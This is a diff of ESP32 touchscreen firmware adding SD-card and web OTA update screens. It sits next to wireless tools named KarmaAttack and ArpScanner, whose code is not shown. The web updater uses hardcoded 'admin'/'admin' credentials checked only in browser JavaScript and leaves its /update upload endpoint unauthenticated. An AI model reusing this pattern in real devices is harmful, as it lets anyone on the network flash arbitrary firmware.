+  while (proceed) {
+    const uint32_t now = millis();
+    if (feature_exit_requested) {
+      return;
+    }
+    if ((uint32_t)(now - lastInputMs) >= 50u) {
+      lastInputMs = now;
+      if (featureHasTouchNavBar()) {
+        maintainTouchNavBar();
+      }
+      if (fwActionPressed("Back")) {
+        drawMenu();
+        return;
+      }
+      int x, y;
+      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
+        drawMenu();
+        return;
+      }
+    }
+
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 30 + yshift);
+    tft.println("Initializing SD...");
+
+    bool ok = spiEnsureSD();
+    if (!ok) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 40 + yshift);
+      tft.println("X SD init failed!");
+      tft.setCursor(10, 50 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.setCursor(10, 40 + yshift);
+    tft.println("SD card OK");
+
+    if (!SD.exists(FIRMWARE_FILE)) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("X Firmware not found!");
+      tft.setCursor(10, 40 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+
+    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
+    if (!firmwareFile) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("X File open failed!");
+      tft.setCursor(10, 40 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+
+    size_t fileSize = firmwareFile.size();
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 50 + yshift);
+    tft.printf("Size: %u bytes\n", fileSize);
+    if (!Update.begin(fileSize)) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("X Update init failed!");
+      tft.setCursor(10, 40 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+
+    tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    tft.setCursor(10, 60 + yshift);
+    tft.println("Updating...");
+    size_t written = Update.writeStream(firmwareFile);
+    if (written != fileSize) {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("X Update failed!");
+      tft.setCursor(10, 40 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.setCursor(10, 20 + yshift);
+    tft.println("Update OK!");
+    if (Update.end(true)) {
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("Rebooting...");
+      delay(2000);
+      ESP.restart();
+    } else {
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.println("X Finalize failed!");
+      tft.setCursor(10, 40 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        drawMenu();
+        return;
+      }
+      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.println("Starting SD Update...");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      continue;
+    }
+    proceed = false;
+  }
+}
+
+bool selectWiFiNetwork() {
+  uiDrawn = false;
+  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setCursor(10, 50);
+  tft.setTextColor(GREEN);
+  tft.setTextSize(1);
+  tft.println("Scanning.");
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  int numNetworks = WiFi.scanNetworks();
+  if (numNetworks <= 0) {
+    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    tft.println("No networks found.");
+    tft.setCursor(10, 60);
+    tft.println("Touch to retry");
+    drawTabBar("Back", false, "Rescan", false, "", true);
+    fwEnsureToolbar();
+    while (true) {
+      if (featureHasTouchNavBar()) {
+        maintainTouchNavBar();
+      }
+      if (fwActionPressed("Back")) {
+        return false;
+      }
+      if (fwActionPressed("Rescan")) {
+        return selectWiFiNetwork();
+      }
+      int x, y;
+      if (readTouchXY(x, y)) {
+        delay(200);
+        if (fwActionPressed("Back", x, y, true)) {
+          return false;
+        }
+        if (fwActionPressed("Rescan", x, y, true)) {
+          return selectWiFiNetwork();
+        }
+        break;
+      }
+      delay(10);
+    }
+    return false;
+  }
+
+  NetworkInfo* networks = new NetworkInfo[numNetworks];
+  for (int i = 0; i < numNetworks; i++) {
+    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
+    networks[i].ssid[31] = '\0';
+    networks[i].rssi = WiFi.RSSI(i);
+    networks[i].channel = WiFi.channel(i);
+    networks[i].authmode = WiFi.encryptionType(i);
+  }
+
+  int startIndex = 0;
+  int selectedIndex = -1;
+  bool selected = false;
+  int lastPaintedStart = -1;
+  int lastPaintedSel = -2;
+  while (!selected) {
+    if (featureHasTouchNavBar()) {
+      maintainTouchNavBar();
+    }
+    if (feature_exit_requested) {
+      delete[] networks;
+      wifiPassword[0] = '\0';
+      return false;
+    }
+    if (fwActionPressed("Back")) {
+      delete[] networks;
+      wifiPassword[0] = '\0';
+      return false;
+    }
+    if (fwActionPressed("Rescan")) {
+      delete[] networks;
+      return selectWiFiNetwork();
+    }
+    if (fwActionPressed("Prev") && startIndex > 0) {
+      startIndex -= FW_NETWORKS_PER_PAGE;
+      selectedIndex = -1;
+    }
+    if (fwActionPressed("Next") && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
+      startIndex += FW_NETWORKS_PER_PAGE;
+      selectedIndex = -1;
+    }
+    if (startIndex != lastPaintedStart || selectedIndex != lastPaintedSel) {
+      drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
+      lastPaintedStart = startIndex;
+      lastPaintedSel = selectedIndex;
+    }
+    int x, y;
+    if (!readTouchXY(x, y)) {
+      delay(10);
+      continue;
+    }
+    delay(200);
+
+    int y_pos = NETWORK_Y_START;
+    int end_index = min(startIndex + FW_NETWORKS_PER_PAGE, numNetworks);
+    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
+      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
+        char buf[64];
+        char ssid[16];
+        strncpy(ssid, networks[i].ssid, 11);
+        ssid[11] = '\0';
+        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
+        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
+        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
+        tft.setTextColor(ORANGE, TFT_BLACK);
+        tft.setTextSize(1);
+        tft.setCursor(10, y_pos);
+        tft.println(buf);
+        delay(100);
+        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
+        tft.setCursor(10, y_pos);
+        tft.println(buf);
+        selectedIndex = i;
+        strncpy(selectedSSID, networks[i].ssid, 31);
+        selectedSSID[31] = '\0';
+        selected = true;
+        break;
+      }
+      y_pos += NETWORK_ROW_HEIGHT;
+    }
+
+    if (fwActionPressed("Back", x, y, true)) {
+      delete[] networks;
+      wifiPassword[0] = '\0';
+      return false;
+    }
+    if (fwActionPressed("Rescan", x, y, true)) {
+      delete[] networks;
+      return selectWiFiNetwork();
+    }
+    if (fwActionPressed("Prev", x, y, true) && startIndex > 0) {
+      startIndex -= FW_NETWORKS_PER_PAGE;
+      selectedIndex = -1;
+    }
+    if (fwActionPressed("Next", x, y, true) && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
+      startIndex += FW_NETWORKS_PER_PAGE;
+      selectedIndex = -1;
+    }
+  }
+
+  delete[] networks;
+  return true;
+}
+
+void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  const int bodyBottom = fwContentBottom();
+  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
+  tft.setTextSize(1);
+
+  if (numNetworks == 0) {
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    tft.println("No networks found.");
+  } else {
+    int y = 50;
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, y);
+    tft.println("Networks:");
+    y += 20;
+
+    int start_index = startIndex;
+    int end_index = min(start_index + FW_NETWORKS_PER_PAGE, numNetworks);
+
+    for (int i = start_index; i < end_index && y < 300; i++) {
+      char buf[64];
+      char ssid[16];
+      strncpy(ssid, networks[i].ssid, 11);
+      ssid[11] = '\0';
+      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
+      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
+      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
+      tft.setCursor(10, y);
+      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
+      tft.println(buf);
+      y += NETWORK_ROW_HEIGHT;
+    }
+
+    char page_buf[20];
+    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / FW_NETWORKS_PER_PAGE + 1, (numNetworks + FW_NETWORKS_PER_PAGE - 1) / FW_NETWORKS_PER_PAGE);
+    tft.setCursor(180, 50);
+    tft.setTextColor(GREEN);
+    tft.println(page_buf);
+  }
+
+  bool prevDisabled = startIndex == 0;
+  bool nextDisabled = (startIndex + FW_NETWORKS_PER_PAGE) >= numNetworks;
+  drawNetworkTabBar(prevDisabled, nextDisabled);
+  fwEnsureToolbar();
+}
+
+bool enterWiFiPassword() {
+  wifiPassword[0] = '\0';
+
+  OnScreenKeyboardConfig cfg;
+  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
+  cfg.titleLine2      = "selected network. ^ caps, # sym";
+  osKeyboardUseStandardLayout(cfg);
+  cfg.maxLen          = PASSWORD_MAX_LENGTH;
+  cfg.shuffleNames    = nullptr;
+  cfg.shuffleCount    = 0;
+  cfg.buttonsY        = 195;
+  cfg.backLabel       = "Back";
+  cfg.middleLabel     = "Del";
+  cfg.okLabel         = "OK";
+  cfg.enableShuffle   = false;
+  cfg.requireNonEmpty = true;
+  cfg.emptyErrorMsg   = "Password cannot be empty!";
+
+  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");
+
+  if (!r.accepted) {
+
+    wifiPassword[0] = '\0';
+    return false;
+  }
+
+  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
+  for (size_t i = 0; i < n; ++i) {
+    wifiPassword[i] = r.text[i];
+  }
+  wifiPassword[n] = '\0';
+
+  return true;
+}
+
+void performWebOTAUpdate() {
+  uiDrawn = false;
+  static size_t totalUploaded = 0;
+  bool inUpdate = false;
+
+  if (!selectWiFiNetwork()) {
+    drawMenu();
+    return;
+  }
+
+  if (!enterWiFiPassword()) {
+    drawMenu();
+    return;
+  }
+
+  updateStatusBar();
+  runUI();
+  const int bodyBottom = fwContentBottom();
+  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
+  tft.setCursor(10, 10 + yshift);
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.println("Starting Web OTA...");
+  drawTabBar("", false, "", false, "Back", false);
+
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 30 + yshift);
+  tft.println("Connecting Wi-Fi");
+  fwEnsureToolbar();
+  WiFi.begin(selectedSSID, wifiPassword);
+  int attempts = 0;
+  uint32_t lastConnectPollMs = 0;
+  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
+    const uint32_t now = millis();
+    if ((uint32_t)(now - lastConnectPollMs) >= 50u) {
+      lastConnectPollMs = now;
+      if (featureHasTouchNavBar()) {
+        maintainTouchNavBar();
+      }
+      if (feature_exit_requested) {
+        WiFi.disconnect();
+        return;
+      }
+      if (fwActionPressed("Back")) {
+        WiFi.disconnect();
+        drawMenu();
+        return;
+      }
+      int x, y;
+      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
+        WiFi.disconnect();
+        drawMenu();
+        return;
+      }
+    }
+    delay(500);
+    attempts++;
+  }
+  if (WiFi.status() != WL_CONNECTED) {
+    tft.setTextColor(UI_WARN, TFT_BLACK);
+    tft.setCursor(10, 40 + yshift);
+    tft.println("X Wi-Fi failed!");
+    tft.setCursor(10, 50 + yshift);
+    tft.println("Touch to retry or Back");
+    drawTabBar("", false, "", false, "Back", false);
+    fwRestoreNavChrome();
+    int x, y;
+    if (waitForTouchXY(x, y)) {
+      WiFi.disconnect();
+      drawMenu();
+      return;
+    }
+    performWebOTAUpdate();
+    return;
+  }
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(10, 40 + yshift);
+  tft.println("Wi-Fi OK");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 50 + yshift);
+  tft.print("IP: ");
+  tft.println(WiFi.localIP());
+  tft.setCursor(10, 70 + yshift);
+  tft.println("URL: http://esp32.local");
+  tft.setCursor(10, 80 + yshift);
+  tft.println("User: admin");
+  tft.setCursor(10, 90 + yshift);
+  tft.println("Pass: admin");
+
+  if (!MDNS.begin(host)) {
+    tft.setTextColor(UI_WARN, TFT_BLACK);
+    tft.setCursor(10, 40 + yshift);
+    tft.println("X mDNS failed!");
+    tft.setCursor(10, 50 + yshift);
+    tft.println("Touch to retry or Back");
+    drawTabBar("", false, "", false, "Back", false);
+    fwRestoreNavChrome();
+    int x, y;
+    if (waitForTouchXY(x, y)) {
+      WiFi.disconnect();
+      drawMenu();
+      return;
+    }
+    performWebOTAUpdate();
+    return;
+  }
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  tft.setCursor(10, 110 + yshift);
+  tft.println("mDNS OK");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 120 + yshift);
+  tft.println("Web server ready!");
+  tft.setCursor(10, 130 + yshift);
+  tft.println("Access via browser");
+
+  server.on("/", HTTP_GET, []() {
+    server.sendHeader("Connection", "close");
+    server.send(200, "text/html", loginIndex);
+  });
+  server.on("/serverIndex", HTTP_GET, []() {
+    server.sendHeader("Connection", "close");
+    server.send(200, "text/html", serverIndex);
+  });
+  server.on("/update", HTTP_POST, []() {
+    server.sendHeader("Connection", "close");
+    bool success = !Update.hasError();
+    server.send(200, "text/plain", success ? "OK" : "FAIL");
+    if (success) {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_GREEN, TFT_BLACK);
+      tft.setTextSize(1);
+      tft.println("Update OK!");
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(10, 20 + yshift);
+      tft.println("Rebooting...");
+      delay(2000);
+      ESP.restart();
+    } else {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(UI_WARN, TFT_BLACK);
+      tft.println("X Update Failed!");
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(10, 20 + yshift);
+      tft.println("Touch to retry or Back");
+      drawTabBar("", false, "", false, "Back", false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        server.close();
+        WiFi.disconnect();
+        drawMenu();
+        return;
+      }
+      performWebOTAUpdate();
+    }
+  }, [&inUpdate, &totalUploaded]() {
+    HTTPUpload& upload = server.upload();
+    if (upload.status == UPLOAD_FILE_START) {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      tft.setCursor(10, 10 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setTextSize(1);
+      tft.println("Web OTA Started...");
+      drawTabBar("", false, "", false, "Back", true);
+      totalUploaded = 0;
+      inUpdate = true;
+      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
+        Update.printError(Serial);
+      }
+    } else if (upload.status == UPLOAD_FILE_WRITE) {
+      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
+        Update.printError(Serial);
+      }
+      totalUploaded += upload.currentSize;
+      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
+      tft.fillRect(10, 30 + yshift, 220, 10, TFT_BLACK);
+      tft.setCursor(10, 30 + yshift);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.printf("Progress: %d%%", percent);
+    } else if (upload.status == UPLOAD_FILE_END) {
+      if (Update.end(true)) {
+        Serial.printf("Update Success: %u\n", upload.totalSize);
+      } else {
+        Update.printError(Serial);
+      }
+      totalUploaded = 0;
+      inUpdate = false;
+    }
+  });
+
+  server.begin();
+  fwEnsureToolbar();
+
+  uint32_t lastInputMs = 0;
+  while (true) {
+    server.handleClient();
+    const uint32_t now = millis();
+    if ((uint32_t)(now - lastInputMs) >= 50u) {
+      lastInputMs = now;
+      if (featureHasTouchNavBar()) {
+        maintainTouchNavBar();
+      }
+      if (feature_exit_requested) {
+        server.close();
+        WiFi.disconnect();
+        return;
+      }
+      if (!inUpdate) {
+        if (fwActionPressed("Back")) {
+          server.close();
+          WiFi.disconnect();
+          drawMenu();
+          return;
+        }
+        int x, y;
+        if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
+          server.close();
+          WiFi.disconnect();
+          drawMenu();
+          return;
+        }
+      }
+    }
+    delay(1);
+  }
+}
+
+void updateSetup() {
+
+  fwResetNavCache();
+  tft.fillScreen(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setTextSize(0);
+
+  setupTouchscreen();
+
+  uiDrawn = false;
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  runUI();
+
+  drawMenu();
+}
+
+void updateLoop() {
+
+  if (featureHasTouchNavBar()) {
+    maintainTouchNavBar();
+    if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
+      feature_exit_requested = true;
+      return;
+    }
+  } else if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
+  updateStatusBar();
+  runUI();
+  if (feature_exit_requested) return;
+
+  if (fwActionPressed("Back")) {
+    feature_exit_requested = true;
+    delay(200);
+    return;
+  }
+
+  int x, y;
+  if (readTouchXY(x, y)) {
+    if (fwActionPressed("Back", x, y, true)) {
+      feature_exit_requested = true;
+      delay(200);
+      return;
+    }
+    if (checkButton(x, y, BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
+      performSDUpdate();
+    }
+    else if (checkButton(x, y, BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT)) {
+      performWebOTAUpdate();
+    }
+    delay(200);
+  }
+}
+}
+
+// ─── Ported from 1.7.2: WiFi new features ───
+
+extern "C" {
+#include "lwip/etharp.h"
+#include "lwip/netif.h"
 }
 
 namespace HiddenSsidReveal {
@@ -6669,7 +8119,6 @@ void hiddenSsidLoop() {
 
 }  // namespace HiddenSsidReveal
 
-
 namespace WpsScanner {
 
 #define SCREEN_WIDTH 240
@@ -7140,7 +8589,6 @@ void wpsScannerLoop() {
 }
 
 }  // namespace WpsScanner
-
 
 namespace ArpScanner {
 
@@ -8023,7 +9471,6 @@ void arpScannerLoop() {
 }
 
 }  // namespace ArpScanner
-
 
 namespace KarmaAttack {
 
@@ -9238,1432 +10685,3 @@ void karmaLoop() {
 }
 
 }  // namespace KarmaAttack
-
-
-namespace FirmwareUpdate {
-
-#define FIRMWARE_FILE "/firmware.bin"
-
-const char* host = "esp32";
-
-#define SCREEN_WIDTH 240
-#define SCREEN_HEIGHT 320
-
-#define BUTTON_WIDTH 230
-#define BUTTON_HEIGHT 20
-#define BUTTON1_X 5
-#define BUTTON1_Y 50
-#define BUTTON2_X 5
-#define BUTTON2_Y 80
-
-#define TAB_BUTTON_WIDTH 57
-#define TAB_BUTTON_HEIGHT 16
-#define TAB_LEFT_X 0
-#define TAB_MIDDLE_X 117
-#define TAB_RIGHT_X 177
-#define TAB_Y 304
-
-#define TS_MIN_X 300
-#define TS_MAX_X 3800
-#define TS_MIN_Y 300
-#define TS_MAX_Y 3800
-
-#define FW_NETWORKS_PER_PAGE 15
-#define NETWORK_Y_START 70
-#define NETWORK_ROW_HEIGHT 15
-
-#define PASSWORD_MAX_LENGTH 32
-
-WebServer server(80);
-
-char selectedSSID[32] = "";
-char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";
-
-typedef struct {
-  char ssid[32];
-  int8_t rssi;
-  uint8_t channel;
-  uint8_t authmode;
-} NetworkInfo;
-
-void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
-void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
-void drawMenu();
-bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
-static bool waitForTouchXY(int& x, int& y);
-void performSDUpdate();
-void drawNetworkList(int, int, NetworkInfo*, int);
-bool selectWiFiNetwork();
-bool enterWiFiPassword();
-void performWebOTAUpdate();
-
-const char* loginIndex = R"(
-<!DOCTYPE html>
-<html lang='en'>
-<head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-    <title>ESP32 Login Page</title>
-    <style>
-        body {
-            background-color: #1A1A1A;
-            color: #E0E0E0;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #2A2A2A;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h2 {
-            margin-bottom: 1.5rem;
-            font-size: 1.8rem;
-            color: #FFFFFF;
-        }
-        .form-group {
-            margin-bottom: 1.5rem;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-size: 1rem;
-            color: #E0E0E0;
-        }
-        input[type='text'],
-        input[type='password'] {
-            width: 100%;
-            padding: 0.8rem;
-            border: 1px solid #4A4A4A;
-            border-radius: 5px;
-            background-color: #3A3A3A;
-            color: #E0E0E0;
-            font-size: 1rem;
-            box-sizing: border-box;
-        }
-        input[type='submit'] {
-            width: 100%;
-            padding: 0.8rem;
-            border: none;
-            border-radius: 5px;
-            background-color: #FFE221;
-            color: #1A1A1A;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        input[type='submit']:hover {
-            background-color: #FFF14A;
-        }
-    </style>
-</head>
-<body>
-    <div class='container'>
-        <h2>ESP32 Login Page</h2>
-        <form name='loginForm'>
-            <div class='form-group'>
-                <label for='userid'>Username:</label>
-                <input type='text' name='userid' id='userid'>
-            </div>
-            <div class='form-group'>
-                <label for='pwd'>Password:</label>
-                <input type='password' name='pwd' id='pwd'>
-            </div>
-            <input type='submit' onclick='check(this.form); return false;' value='Login'>
-        </form>
-    </div>
-    <script>
-        function check(form) {
-            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
-                window.open('/serverIndex');
-            } else {
-                alert('Error Password or Username');
-            }
-        }
-    </script>
-</body>
-</html>
-)";
-
-const char* serverIndex = R"(
-<!DOCTYPE html>
-<html lang='en'>
-<head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-    <title>ESP32 Firmware Update</title>
-    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
-    <style>
-        body {
-            background-color: #1A1A1A;
-            color: #E0E0E0;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #2A2A2A;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h2 {
-            margin-bottom: 1.5rem;
-            font-size: 1.8rem;
-            color: #FFFFFF;
-        }
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        input[type='file'] {
-            width: 100%;
-            padding: 0.8rem;
-            border: 1px solid #4A4A4A;
-            border-radius: 5px;
-            background-color: #3A3A3A;
-            color: #E0E0E0;
-            font-size: 1rem;
-            box-sizing: border-box;
-            cursor: pointer;
-        }
-        input[type='file']::-webkit-file-upload-button {
-            background-color: #4A4A4A;
-            color: #E0E0E0;
-            border: none;
-            padding: 0.5rem 1rem;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        input[type='file']::-webkit-file-upload-button:hover {
-            background-color: #5A5A5A;
-        }
-        input[type='submit'] {
-            width: 100%;
-            padding: 0.8rem;
-            border: none;
-            border-radius: 5px;
-            background-color: #FFE221;
-            color: #1A1A1A;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        input[type='submit']:hover {
-            background-color: #FFF14A;
-        }
-        #progress-container {
-            margin-top: 1rem;
-            width: 100%;
-            background-color: #3A3A3A;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-        #prg {
-            width: 0%;
-            height: 20px;
-            background-color: #FFE221;
-            text-align: center;
-            line-height: 20px;
-            color: #1A1A1A;
-            border-radius: 5px;
-            transition: width 0.3s ease-in-out;
-        }
-    </style>
-</head>
-<body>
-    <div class='container'>
-        <h2>Firmware Update</h2>
-        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
-            <div class='form-group'>
-                <input type='file' name='update'>
-            </div>
-            <input type='submit' value='Update'>
-        </form>
-        <div id='progress-container'>
-            <div id='prg'>progress: 0%</div>
-        </div>
-    </div>
-    <script>
-        $('form').submit(function(e) {
-            e.preventDefault();
-            var form = $('#upload_form')[0];
-            var data = new FormData(form);
-            $.ajax({
-                url: '/update',
-                type: 'POST',
-                data: data,
-                contentType: false,
-                processData: false,
-                xhr: function() {
-                    var xhr = new window.XMLHttpRequest();
-                    xhr.upload.addEventListener('progress', function(evt) {
-                        if (evt.lengthComputable) {
-                            var per = evt.loaded / evt.total;
-                            var percent = Math.round(per * 100);
-                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
-                        }
-                    }, false);
-                    return xhr;
-                },
-                success: function(d, s) {
-                    console.log('success!');
-                },
-                error: function(a, b, c) {
-                    console.log('error:', c);
-                }
-            });
-        });
-    </script>
-</body>
-</html>
-)";
-
-static bool uiDrawn = false;
-static FeatureUI::Button s_fwFooter[4];
-static uint8_t s_fwFooterCount = 0;
-static char s_fwNavCache[5][16] = {{0}};
-
